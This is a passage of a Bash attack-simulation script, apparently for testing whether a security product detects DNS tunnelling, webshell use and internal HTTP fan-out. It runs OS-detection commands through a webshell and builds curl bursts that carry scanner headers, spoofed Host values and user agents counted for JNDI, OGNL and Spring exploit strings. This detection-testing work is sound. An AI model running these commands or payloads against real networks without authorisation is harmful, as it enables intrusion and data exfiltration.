        (( DNS_RESPONSES_RECEIVED < 1 )) && DNS_RESPONSES_RECEIVED="${responded}"
        DNS_TUNNEL_SUCCESS_COUNT="${DNS_RESPONSES_RECEIVED}"
        apply_dns_actual_counts_for_judgment
        return 0
    fi
    return 1
}

reset_dns_tunnel_execution_stats() {
    DNS_QUERIES_ATTEMPTED=0
    DNS_RESPONSES_RECEIVED=0
    DNS_TUNNEL_SUCCESS_COUNT=0
    DNS_TUNNEL_FAILURE_COUNT=0
    DNS_TUNNEL_NXDOMAIN_COUNT=0
    DNS_TUNNEL_TIMEOUT_COUNT=0
    DNS_TUNNEL_ERROR_COUNT=0
    DNS_TUNNEL_RESOLVED_COUNT=0
    DNS_TUNNEL_UNIQUE_QUERIES=0
    DNS_A_QUERIES=0
    DNS_TXT_QUERIES=0
    DNS_TUNNEL_FQDN_LEN_SUM=0
    DNS_TUNNEL_FQDN_LEN_MAX=0
    DNS_TUNNEL_FQDN_COUNT=0
    DNS_TUNNEL_APPROX_ENTROPY=0
    DNS_TUNNEL_GENERATED_FQDN_LIST=""
    DNS_TUNNEL_ENT_SUM=0
    reset_dns_query_verification_stats
}

finalize_dns_tunnel_stage_judgment() {
    local stage_label="$1" detail_prefix="${2:-}"
    local summary="" decision="" reason="" detail="" stage_rc="Failed" sent=0 unique=0 ent=0 resp=0
    event_stage_mark_executed "DNS_TUNNEL" "dns_tunnel_file_client"
    [[ -n "${DNS_TUNNEL_LAST_REMOTE_OUT:-}" ]] && ingest_remote_events "${DNS_TUNNEL_LAST_REMOTE_OUT}" "DNS_TUNNEL" || true
    dns_refresh_sot_from_generated_domains "DNS_TUNNEL" || true
    validate_event_store_integrity || true
    summary=$(build_module_summary_from_events "DNS_TUNNEL" 2>/dev/null || true)
    read -r decision reason <<< "$(validate_module_from_summary "DNS_TUNNEL" "${summary}" "dns_tunnel_file_client")"
    sent=$(safe_int "$(event_summary_field "${summary}" sent 0)")
    unique=$(safe_int "$(event_summary_field "${summary}" unique_fqdn 0)")
    ent=$(safe_int "$(event_summary_field "${summary}" entropy_score 0)")
    resp=$(safe_int "$(event_summary_field "${summary}" response 0)")
    event_sync_legacy_counters_from_sot || true
    DNS_QUERIES_ATTEMPTED="${sent}"
    DNS_TUNNEL_UNIQUE_QUERIES="${unique}"
    DNS_TUNNEL_APPROX_ENTROPY="${ent}"
    DNS_TUNNEL_STAGE_STATUS="${decision}"
    DNS_TUNNEL_FINAL_RESULT="${decision}"
    DNS_TUNNEL_FINAL_REASON="${reason}"
    case "${decision}" in
        success) stage_rc="Success"; detail="${detail_prefix}sent=${sent} unique=${unique} entropy=${ent} responses=${resp}" ;;
        partial) stage_rc="Partial"; detail="${detail_prefix}${reason}" ;;
        skipped) stage_rc="Skipped"; detail="${detail_prefix}${reason}" ;;
        *) stage_rc="Failed"; DNS_TUNNEL_SKIP_REASON="${reason:-evidence_missing}"; detail="${detail_prefix}${DNS_TUNNEL_SKIP_REASON}" ;;
    esac
    set_stage_result "${stage_label}" "${stage_rc}" "${detail}"
    dns_tunnel_log_both "DNS_STAGE_FINAL_SUMMARY stage=${stage_label} status=${decision} sent=${sent} unique_fqdn=${unique} entropy=${ent} responses=${resp} ${summary} decision=${decision} reason=${reason}"
    [[ "${decision}" == success ]]
}

reset_dns_tunnel_enhanced_fallback_stats() {
    DNS_TUNNEL_ENH_ATTEMPTED=0
    DNS_TUNNEL_ENH_SUCCESS=0
    DNS_TUNNEL_ENH_FAIL=0
    DNS_TUNNEL_ENH_NX=0
    DNS_TUNNEL_ENH_TIMEOUT=0
    DNS_TUNNEL_ENH_RESULT="skipped"
    DNS_TUNNEL_ENH_REASON=""
    DNS_TUNNEL_FB_USED="no"
    DNS_TUNNEL_FB_REASON=""
    DNS_TUNNEL_FB_ATTEMPTED=0
    DNS_TUNNEL_FB_SUCCESS=0
    DNS_TUNNEL_FB_FAIL=0
    DNS_TUNNEL_FB_NX=0
    DNS_TUNNEL_FB_TIMEOUT=0
    DNS_TUNNEL_FB_RESULT="skipped"
    DNS_TUNNEL_FINAL_RESULT="failed"
    DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none"
    DNS_TUNNEL_FINAL_REASON=""
}

snapshot_dns_tunnel_enhanced_run_stats() {
    local sim_rc="$1" sim_ran="$2"
    DNS_TUNNEL_ENH_ATTEMPTED=$(safe_int "${DNS_QUERIES_ATTEMPTED}")
    DNS_TUNNEL_ENH_SUCCESS=$(safe_int "${DNS_TUNNEL_SUCCESS_COUNT}")
    DNS_TUNNEL_ENH_FAIL=$(safe_int "${DNS_TUNNEL_FAILURE_COUNT}")
    DNS_TUNNEL_ENH_NX=$(safe_int "${DNS_TUNNEL_NXDOMAIN_COUNT}")
    DNS_TUNNEL_ENH_TIMEOUT=$(safe_int "${DNS_TUNNEL_TIMEOUT_COUNT}")
    if [[ "${sim_ran}" != true ]]; then
        DNS_TUNNEL_ENH_RESULT="skipped"
        DNS_TUNNEL_ENH_REASON="${DNS_TUNNEL_SKIP_REASON:-sim_not_run}"
    elif (( DNS_TUNNEL_ENH_ATTEMPTED > 0 )); then
        DNS_TUNNEL_ENH_RESULT="success"
        DNS_TUNNEL_ENH_REASON="ok"
    else
        DNS_TUNNEL_ENH_RESULT="failed"
        DNS_TUNNEL_ENH_REASON="${DNS_TUNNEL_SKIP_REASON:-zero_queries}"
    fi
}

record_dns_tunnel_enhanced_result() {
    local msg="DNS_TUNNEL_ENHANCED_RESULT attempted=${DNS_TUNNEL_ENH_ATTEMPTED} success=${DNS_TUNNEL_ENH_SUCCESS} fail=${DNS_TUNNEL_ENH_FAIL} nx=${DNS_TUNNEL_ENH_NX} timeout=${DNS_TUNNEL_ENH_TIMEOUT} result=${DNS_TUNNEL_ENH_RESULT} reason=${DNS_TUNNEL_ENH_REASON}"
    state_append "dns_tunnel_enhanced_result.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

record_dns_tunnel_fallback_result() {
    local msg="DNS_TUNNEL_FALLBACK_RESULT used=${DNS_TUNNEL_FB_USED} reason=${DNS_TUNNEL_FB_REASON} attempted=${DNS_TUNNEL_FB_ATTEMPTED} success=${DNS_TUNNEL_FB_SUCCESS} fail=${DNS_TUNNEL_FB_FAIL} nx=${DNS_TUNNEL_FB_NX} timeout=${DNS_TUNNEL_FB_TIMEOUT} result=${DNS_TUNNEL_FB_RESULT}"
    state_append "dns_tunnel_fallback_result.log" "${msg}"
    dns_tunnel_log_both "${msg}"
}

apply_dns_tunnel_enhanced_final_decision() {
    local stage_label="DNS Tunnel Enhanced" detail_prefix="dns enhanced "
    local summary="" decision="" reason="" sent=0 unique=0 ent=0
    event_stage_mark_executed "DNS_TUNNEL" "dns_tunnel_file_client"
    if [[ -n "${DNS_TUNNEL_LAST_REMOTE_OUT:-}" ]]; then
        ingest_remote_events "${DNS_TUNNEL_LAST_REMOTE_OUT}" "DNS_TUNNEL" || true
    fi
    dns_refresh_sot_from_generated_domains "DNS_TUNNEL" || true
    dns_sot_enhanced_fail_fast || true
    summary="${EVENT_MODULE_SUMMARY[DNS_TUNNEL]:-$(build_module_summary_from_events DNS_TUNNEL 2>/dev/null || true)}"
    read -r decision reason <<< "$(validate_module_from_summary "DNS_TUNNEL" "${summary}" "dns_tunnel_file_client")"
    sent=$(safe_int "$(event_summary_field "${summary}" sent 0)")
    unique=$(safe_int "$(event_summary_field "${summary}" unique_fqdn 0)")
    ent=$(safe_int "$(event_summary_field "${summary}" entropy_score 0)")
    DNS_TUNNEL_FINAL_RESULT="${decision}"
    DNS_TUNNEL_FINAL_REASON="${reason}"
    DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="enhanced"
    DNS_QUERIES_ATTEMPTED="${sent}"
    DNS_TUNNEL_UNIQUE_QUERIES="${unique}"
    DNS_TUNNEL_APPROX_ENTROPY="${ent}"
    DNS_TUNNEL_STAGE_STATUS="${decision}"
    case "${decision}" in
        success) set_stage_result "${stage_label}" "Success" "${detail_prefix}sent=${sent} unique=${unique} entropy=${ent}" ;;
        partial) set_stage_result "${stage_label}" "Partial" "${detail_prefix}${reason}" ;;
        skipped) set_stage_result "${stage_label}" "Skipped" "${reason}"; DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none" ;;
        *) set_stage_result "${stage_label}" "Failed" "${reason}"; DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none" ;;
    esac
    dns_tunnel_log_both "DNS_TUNNEL_FINAL_DECISION result=${decision} reason=${reason} ${summary}"
    log_detection_quality "DNS Tunnel" "${sent}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS:-90}" \
        "${DNS_TARGET_SERVER:-1}" "dns_tunnel_entropy" "event_sot" "${reason}"
    compute_detection_score_dns_tunnel
}

apply_dns_tunnel_sim_stats_to_globals() {
    local attempted="$1" planned="$2" unique="$3" success="$4" fail="$5" nx="$6" resolved="$7" timeout="$8" error="$9"
    local a="${10}" txt="${11}" avg="${12}" max="${13}" entropy="${14}" avg_label="${15:-0}" max_label="${16:-0}"
    DNS_QUERIES_ATTEMPTED="${attempted}"
    DNS_QUERIES_PLANNED="${planned:-${DNS_QUERIES_PLANNED:-0}}"
    DNS_TUNNEL_UNIQUE_QUERIES="${unique}"
    DNS_RESPONSES_RECEIVED="${success}"
    DNS_TUNNEL_SUCCESS_COUNT="${success}"
    DNS_TUNNEL_FAILURE_COUNT="${fail}"
    DNS_TUNNEL_NXDOMAIN_COUNT="${nx}"
    DNS_TUNNEL_RESOLVED_COUNT="${resolved}"
    DNS_TUNNEL_TIMEOUT_COUNT="${timeout}"
    DNS_TUNNEL_ERROR_COUNT="${error}"
    DNS_A_QUERIES="${a}"
    DNS_TXT_QUERIES="${txt}"
    DNS_TUNNEL_FQDN_LEN_SUM=$((avg * attempted))
    DNS_TUNNEL_FQDN_LEN_MAX="${max}"
    DNS_TUNNEL_FQDN_COUNT="${attempted}"
    DNS_TUNNEL_LABEL_LEN_SUM=$((avg_label * attempted))
    DNS_TUNNEL_LABEL_LEN_MAX="${max_label}"
    DNS_TUNNEL_LABEL_COUNT="${attempted}"
    DNS_TUNNEL_APPROX_ENTROPY="${entropy}"
    DNS_HIGH_ENTROPY_LABELS="${entropy}"
    DNS_TOTAL_ENTROPY_STYLE_COUNT="${entropy}"
    if [[ -n "${DNS_TUNNEL_LAST_REMOTE_OUT:-}" ]]; then
        dns_ingest_generated_fqdns_from_output "${DNS_TUNNEL_LAST_REMOTE_OUT}"
    fi
    if (( DNS_TUNNEL_FQDN_COUNT > 0 )); then
        dns_finalize_entropy_from_generated_list || true
        avg=$((DNS_TUNNEL_FQDN_LEN_SUM / DNS_TUNNEL_FQDN_COUNT))
        DNS_TUNNEL_FQDN_LEN_SUM=$((avg * attempted))
        (( DNS_TUNNEL_LABEL_COUNT > 0 )) && DNS_TUNNEL_LABEL_LEN_SUM=$((DNS_TUNNEL_LABEL_LEN_SUM / DNS_TUNNEL_LABEL_COUNT * attempted))
    elif (( entropy < 1 && DNS_QUERY_SENT_COUNT > 0 )); then
        dns_finalize_entropy_from_generated_list || true
    fi
    DNS_CLUSTER_LOCAL_COUNT=0
    DNS_EFFECTIVE_TLD_COUNT="${attempted}"
    DNS_SUSPICIOUS_TLD_COUNT=$((attempted * 30 / 100))
    dns_compute_tunnel_detection_likelihood
}

write_dns_tunnel_report() {
    local examples="${DNS_TUNNEL_PAYLOAD_EXAMPLES:-n/a}"
    [[ -z "${REPORT_MD}" ]] && return 0
    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## DNS Tunnel Simulation Summary

| Field | Value |
|---|---|
| DNS server discovery | ${DNS_TARGET_SELECTION_SOURCE:-unknown} (${DNS_TARGET_SELECTION_DETAIL:-n/a}) |
| Fallback resolver used | ${DNS_TUNNEL_FALLBACK_RESOLVER} |
| Target resolver | ${DNS_TARGET_SERVER:-n/a} |
| Mode | ${DNS_TUNNEL_MODE_USED:-${DNS_TUNNEL_MODE}} |
| Domain suffix | ${DNS_TUNNEL_DOMAIN_SUFFIX} |
| Query tool | ${DNS_TUNNEL_QUERY_TOOL:-n/a} |
| Planned query count | ${DNS_QUERIES_PLANNED:-0} |
| Actual sent query count | ${DNS_QUERIES_ATTEMPTED:-0} |
| Success count | ${DNS_TUNNEL_SUCCESS_COUNT:-0} |
| Failure count | ${DNS_TUNNEL_FAILURE_COUNT:-0} |
| NXDOMAIN count | ${DNS_TUNNEL_NXDOMAIN_COUNT:-0} |
| Timeout count | ${DNS_TUNNEL_TIMEOUT_COUNT:-0} |
| Query types (A/TXT) | ${DNS_A_QUERIES:-0} / ${DNS_TXT_QUERIES:-0} |
| Average FQDN length | $(( DNS_TUNNEL_FQDN_COUNT > 0 ? DNS_TUNNEL_FQDN_LEN_SUM / DNS_TUNNEL_FQDN_COUNT : 0 )) |
| Max FQDN length | ${DNS_TUNNEL_FQDN_LEN_MAX:-0} |
| Approximate entropy indicator | ${DNS_TUNNEL_APPROX_ENTROPY:-0} |
| Skip / failure reason | ${DNS_TUNNEL_SKIP_REASON:-none} |

### Generated payload pattern examples
$(printf '%b' "${examples}")

### Expected Stellar detection
- **Detection name:** DNS Tunneling Anomaly (\`dns_tunnel\`)
- **Tactic / Technique:** Exfiltration (TA0010) / T1048 — Exfiltration Over Alternative Protocol
- **Reason this traffic should be detected:**
- High query count (${DNS_QUERIES_ATTEMPTED:-0}) in a short burst window (~5 minutes)
- Repeated burst compared to typical DNS baseline volume
- Long service-like subdomains (cluster.local / infrastructure prefixes)
- High-entropy synthetic labels (base32/base64url style)
- TXT query burst (txt-burst / infrastructure modes)
- Abnormal DNS volume vs typical baseline (Stellar ML: tunneled high-entropy traffic)

EOF
}

run_dns_tunnel_simulation_once() {
    local planned_count="$1" _mode="$2" _dns_server="$3" resolver_source="$4" resolver_reason="$5"
    local sent=0 unique=0
    planned_count=$(resolve_dns_detection_window_plan "${planned_count}")
    log_dns_tunnel_selected_resolver "${DNS_TUNNEL_FILE_TARGETS:-${DNS_TARGET_SERVER:-n/a}}" "${resolver_source:-alive_hosts}" "${resolver_reason:-file_client}"
    DNS_TUNNEL_RESOLVER_SOURCE="${resolver_source:-alive_hosts}"
    dns_tunnel_log_both "simulation_once_redirect mode=dns_tunnel_file_client planned=${planned_count} targets=${DNS_TUNNEL_FILE_TARGETS:-none}"
    run_dns_tunnel_simulator "" "${CAMPAIGN_ID}" || return 1
    event_sync_legacy_counters_from_sot || true
    sent=$(safe_int "${DNS_QUERIES_ATTEMPTED:-0}")
    unique=$(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES:-0}")
    dns_tunnel_log_both "complete targets=${DNS_TUNNEL_FILE_TARGETS:-none} sent=${sent} unique_fqdn=${unique} sendto_based=yes"
    (( sent > 0 ))
}

execute_dns_tunnel_simulation_chunked() {
    local total_planned="$1" _mode="$2" _dns_server="$3" campaign="$4"
    local sent=0 unique=0
    total_planned=$(safe_int "${total_planned}")
    log_detection_window_plan "DNS_Tunnel" "${DNS_TUNNEL_FILE_TARGETS:-${DNS_TARGET_SERVER:-n/a}}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS}" \
        "dns_queries>=${total_planned}" "${total_planned}" "dns_tunnel_file_client_udp53_idx"
    log_dns_tunnel_selected_resolver "${DNS_TUNNEL_FILE_TARGETS:-${DNS_TARGET_SERVER:-n/a}}" "${DNS_TUNNEL_RESOLVER_SOURCE:-alive_hosts}" "dns_tunnel_file_client"
    DNS_TUNNEL_ENH_ATTEMPTED="${total_planned}"
    dns_tunnel_log_both "enhanced_chunked_redirect mode=dns_tunnel_file_client planned=${total_planned} targets=${DNS_TUNNEL_FILE_TARGETS:-none}"
    run_dns_tunnel_simulator "" "${campaign}" || return 1
    event_sync_legacy_counters_from_sot || true
    sent=$(safe_int "${DNS_QUERIES_ATTEMPTED:-0}")
    unique=$(safe_int "${DNS_TUNNEL_UNIQUE_QUERIES:-0}")
    DNS_TUNNEL_ENH_ATTEMPTED="${sent}"
    DNS_TUNNEL_ENH_SUCCESS="${sent}"
    DNS_TUNNEL_ENH_RESULT="success"
    DNS_TUNNEL_ENH_REASON="dns_tunnel_file_client_sendto"
    dns_tunnel_log_both "enhanced_chunked_complete sent=${sent} unique_fqdn=${unique} sendto_based=yes"
    event_apply_module_validation "DNS_TUNNEL" "dns_tunnel_file_client" || true
    (( sent > 0 ))
}

run_dns_tunnel_simulation() {
    local _planned="${1:-${DNS_BURST_COUNT}}" _mode="${2:-${DNS_TUNNEL_MODE}}" sim_result="failed"
    DNS_TUNNEL_SKIP_REASON=""
    DNS_TUNNEL_DOMAIN_SUFFIX="${DNS_TUNNEL_SIM_DOMAIN}"
    DNS_QUERIES_PLANNED=$(net_sim_dns_tunnel_plan_idx_count)
    poc_sot_paths_init
    : > "${DNS_GENERATED_DOMAINS_LOG:-${LOCAL_STATE_DIR}/dns_generated_domains.log}" 2>/dev/null || true
    : > "${DNS_GENERATED_FQDN_KEYS:-${LOCAL_STATE_DIR}/dns_generated_fqdn.keys}" 2>/dev/null || true
    reset_dns_tunnel_execution_stats
    dns_tunnel_log_both "simulation_start mode=dns_tunnel_file_client domain=${DNS_TUNNEL_SIM_DOMAIN} planned_idx=${DNS_QUERIES_PLANNED} payload_mb=${DNS_TUNNEL_PAYLOAD_MB} duration_sec=${DNS_TUNNEL_DURATION_SEC}"
    log_message "OK" "DNS Tunnel File Client: UDP/53 sendto strt/idx/end domain=${DNS_TUNNEL_SIM_DOMAIN} planned_idx=${DNS_QUERIES_PLANNED}"

    if run_dns_tunnel_simulator "" "${CAMPAIGN_ID}"; then
        sim_result="${DNS_TUNNEL_STAGE_STATUS:-success}"
        event_sync_legacy_counters_from_sot || true
        if [[ "${DRY_RUN}" == true ]]; then
            log_detection_window_plan "DNS_Tunnel" "${DNS_TUNNEL_FILE_TARGETS:-${DNS_TARGET_SERVER:-n/a}}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS}" \
                "dns_queries>=${DNS_QUERIES_PLANNED}" "${DNS_QUERIES_PLANNED}" \
                "dns_tunnel_file_client_${DETECTION_WINDOW_BUCKET_SECONDS}s_bucket"
            log_detection_window_summary "DNS_Tunnel" "${DNS_TUNNEL_FILE_TARGETS:-${DNS_TARGET_SERVER:-n/a}}" "${DETECTION_WINDOW_DNS_WINDOW_SECONDS}" \
                "${DNS_QUERIES_PLANNED}" "dns_queries>=${DNS_QUERIES_PLANNED}" yes high "dry-run_sot_events"
        fi
        log_dns_tunnel_final_summary "${sim_result}"
        log_message "OK" "DNS Tunnel File Client complete: sent=${DNS_QUERIES_ATTEMPTED:-0} unique=${DNS_TUNNEL_UNIQUE_QUERIES:-0} targets=${DNS_TUNNEL_FILE_TARGETS:-n/a}"
        log_message "OK" "Expected Stellar detection: DNS Tunneling Anomaly (dns_tunnel_file_client / T1048)"
        return 0
    fi

    if net_sim_dns_tunnel_classify_env_failure "${DNS_TUNNEL_SKIP_REASON:-}" 2>/dev/null; then
        DNS_TUNNEL_STAGE_STATUS="environment_failure"
        log_dns_tunnel_final_summary "environment_failure"
        dns_tunnel_log_both "environment_failure reason=${DNS_TUNNEL_SKIP_REASON}"
        return 1
    fi

    sim_result="failed"
    log_dns_tunnel_final_summary "${sim_result}"
    dns_tunnel_log_both "skip reason=${DNS_TUNNEL_SKIP_REASON:-no_sendto_packets}"
    return 1
}

detect_webshell_remote_os() {
    local out os_raw=""
    if [[ "${DRY_RUN}" == true ]]; then
        WEBSHELL_REMOTE_OS="linux"
        return 0
    fi
    out=$(run_webshell_quick "webshell-os-detect" \
        "uname -s 2>/dev/null || true; cmd /c ver 2>/dev/null | head -n1 || true" 2>/dev/null || true)
    out=$(printf '%s' "${out}" | tr -d '\r')
    os_raw=$(printf '%s\n' "${out}" | head -n1)
    if [[ "${out}" == *[Ww]indows* ]] || [[ "${out}" == *MSFT* ]] || [[ "${out}" == *Microsoft* ]]; then
        WEBSHELL_REMOTE_OS="windows"
    elif [[ "${out}" == *Darwin* ]]; then
        WEBSHELL_REMOTE_OS="macos"
    else
        WEBSHELL_REMOTE_OS="linux"
    fi
    log_message "OK" "Webshell remote OS: ${WEBSHELL_REMOTE_OS} (sample=${os_raw:-unknown})"
}


build_internal_fanout_curl_cmd() {
    local host="$1" port="$2" req="$3" scheme="$4" campaign="$5" curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    remote_bash_script_open 'INTERNAL_FANOUT_SCRIPT'
    cat <<EOF
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
paths='/api/v1/check-in /update/check /cdn/status /api/v1/sync /favicon.ico /health /hidden-panel /internal-sync /admin-backup /api/private/status /.well-known/internal-update /v2/private/health'
methods='GET HEAD POST'
a=0; r=0; c=0; jndi=0; ognl=0; spring=0
node=\$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9-' | head -c 16)
sess="fanout-\${node}-\${RANDOM}"
extra_hdr(){
case \$((RANDOM%8)) in
    0) echo "-H 'X-Scanner: true'" ;;
    1) echo "-H 'X-Recon: enabled'" ;;
    2) echo "-H 'X-Asset-Discovery: active'" ;;
    3) echo "-H 'X-Internal-Audit: yes'" ;;
    4) echo "-H 'X-Discovery-Mode: survey'" ;;
    5) echo "-H 'Host: internal-update.company-data.cc'" ;;
    6) echo "-H 'Host: sync-node.inventory.to'" ;;
    7) echo "-H 'Host: telemetry-cache.update.top'" ;;
esac
}
for i in \$(seq 1 ${req}); do
p=\$(echo "\$paths" | tr ' ' '\n' | sed -n "\$((1+RANDOM%13))p")
m=\$(echo "\$methods" | tr ' ' '\n' | sed -n "\$((1+RANDOM%3))p")
ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
track_fanout_ua "\$ua"
hdr=\$(extra_hdr)
a=\$((a+1))
if [[ "\$m" == POST ]]; then
    code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -X POST -A "\$ua" \
    -H 'X-PoC-Campaign: ${campaign}' -H 'X-Callback-Mode: internal-web-fanout' -H 'X-Check-In: sync' -H "X-Node-ID: \${node}" -H "X-Session-ID: \${sess}" -H 'X-Forwarded-For: 10.0.0.50' \$hdr \
    --data-urlencode "campaign=${campaign}" --data-urlencode "mode=check-in" '${base_url}'"\$p" 2>/dev/null || echo 000)
elif [[ "\$m" == HEAD ]]; then
    code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -I -A "\$ua" \
    -H 'X-PoC-Campaign: ${campaign}' -H 'X-Callback-Mode: internal-web-fanout' -H 'X-Sync: true' -H "X-Node-ID: \${node}" -H "X-Session-ID: \${sess}" -H 'X-Forwarded-For: 10.0.0.50' \$hdr \
    '${base_url}'"\$p" 2>/dev/null || echo 000)
else
    code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -A "\$ua" \
    -H 'X-PoC-Campaign: ${campaign}' -H 'X-Callback-Mode: internal-web-fanout' -H 'X-Beacon: true' -H "X-Node-ID: \${node}" -H "X-Session-ID: \${sess}" -H 'X-Forwarded-For: 10.0.0.50' \$hdr \
    '${base_url}'"\$p?c=${campaign}&n=\$RANDOM&sync=1" 2>/dev/null || echo 000)
fi
code=\$(printf '%s' "\$code" | tr -cd '0-9')
log_http_ua_request "\$p" "\$ua" "\$code"
[[ -n "\$code" && "\$code" != "000" ]] && { r=\$((r+1)); c=\$((c+1)); }
if [[ \$((i % 9)) -eq 0 ]]; then sleep \$((RANDOM % 2)); fi
done
emit_http_ua_coverage
echo "FANOUT_STATS attempted=\$a responses=\$r connected=\$c jndi=\$jndi ognl=\$ognl spring=\$spring"
EOF
    remote_bash_script_close 'INTERNAL_FANOUT_SCRIPT'
}

parse_fanout_stats_line() {
    local out="$1" line attempted=0 responses=0 connected=0 jndi=0 ognl=0 spring=0
    line=$(printf '%s\n' "${out}" | grep 'FANOUT_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        responses=$(safe_int "$(sed -n 's/.*responses=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        connected=$(safe_int "$(sed -n 's/.*connected=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        jndi=$(safe_int "$(sed -n 's/.*jndi=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        ognl=$(safe_int "$(sed -n 's/.*ognl=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        spring=$(safe_int "$(sed -n 's/.*spring=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    fi
    printf '%s %s %s %s %s %s' "${attempted}" "${responses}" "${connected}" "${jndi}" "${ognl}" "${spring}"
}

parse_fanout_chunk_stats_line() {
    local out="$1" line attempted=0 responses=0 connected=0 jndi=0 ognl=0 spring=0
    line=$(printf '%s\n' "${out}" | grep 'FANOUT_CHUNK_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        responses=$(safe_int "$(sed -n 's/.*responses=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        connected=$(safe_int "$(sed -n 's/.*connected=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        jndi=$(safe_int "$(sed -n 's/.*jndi=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        ognl=$(safe_int "$(sed -n 's/.*ognl=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        spring=$(safe_int "$(sed -n 's/.*spring=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    fi
    printf '%s %s %s %s %s %s' "${attempted}" "${responses}" "${connected}" "${jndi}" "${ognl}" "${spring}"
}

build_fanout_chunk_cmd() {
    local host="$1" port="$2" scheme="$3" chunk_size="$4" campaign="$5"
    local curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/")
    base_url="${base_url%/}/"
    cat <<EOF
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
a=0;r=0;c=0;j=0;o=0;sp=0
i=1
while [ "\$i" -le ${chunk_size} ]; do
a=\$((a+1))
ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
echo "\$ua" | grep -qF 'jndi:' && j=\$((j+1))
echo "\$ua" | grep -qF '%{#context' && o=\$((o+1))
echo "\$ua" | grep -qF 'class.module.classLoader' && sp=\$((sp+1))
p=favicon.ico
case \$((RANDOM % 4)) in 0) p=health ;; 1) p=api/v1/check-in ;; 2) p=favicon.ico ;; 3) p=hidden-panel ;; esac
code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -A "\$ua" -H 'X-PoC-Campaign: ${campaign}' -H 'X-Callback-Mode: internal-web-fanout' '${base_url}'"\$p" 2>/dev/null || echo 000)
code=\$(printf '%s' "\$code" | tr -cd '0-9')
log_http_ua_request "\$p" "\$ua" "\$code"
case "\$code" in 000|"") ;; *) r=\$((r+1)); c=\$((c+1));; esac
i=\$((i+1))
done
emit_http_ua_coverage
echo "FANOUT_CHUNK_STATS attempted=\$a responses=\$r connected=\$c jndi=\$j ognl=\$o spring=\$sp"
EOF
}

build_fanout_single_probe_cmd() {
    local host="$1" port="$2" scheme="$3" campaign="$4"
    local curl_tls="" base_url
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    [[ "${scheme}" == "https" ]] && curl_tls="-k"
    base_url=$(build_web_target_url "${scheme}" "${host}" "${port}" "/favicon.ico")
    cat <<EOF
$(http_ua_remote_bash_snippet)
$(http_url_scan_ua_policy_remote_snippet)
SCAN_TARGET='${host}'
echo "HTTP_UA_POLICY scope=url_scan normal_ua_allowed=no ua_required=yes rare_ratio=50 payload_ratio=50"
ua_cov_total=0; ua_cov_present=0; ua_cov_missing=0; ua_cov_normal=0; ua_cov_rare=0; ua_cov_payload=0; ua_cov_abnormal=0
ua=\$(ensure_ua_nonempty "\$(pick_burst_ua)")
code=\$(curl ${curl_tls} -s -o /dev/null -w '%{http_code}' --max-time 2 -A "\$ua" -H 'X-PoC-Campaign: ${campaign}' '${base_url}' 2>/dev/null || echo 000)
log_http_ua_request '/favicon.ico' "\$ua" "\$code"
emit_http_ua_coverage
echo FANOUT_CHUNK_STATS attempted=1 responses=1 connected=1 jndi=0 ognl=0 spring=0
EOF
}

execute_internal_fanout_chunked() {
    local host="$1" port="$2" scheme="$3" req="$4" campaign="$5"
    local chunk_size=6 chunks c remaining this_chunk chunk_out
    local chunk_at=0 chunk_resp=0 chunk_conn=0 chunk_j=0 chunk_o=0 chunk_sp=0
    local total_a=0 total_r=0 total_c=0 total_j=0 total_o=0 total_sp=0
    (( req < 1 )) && req=1
    chunk_size=6
    chunks=$(( (req + chunk_size - 1) / chunk_size ))
    remaining="${req}"
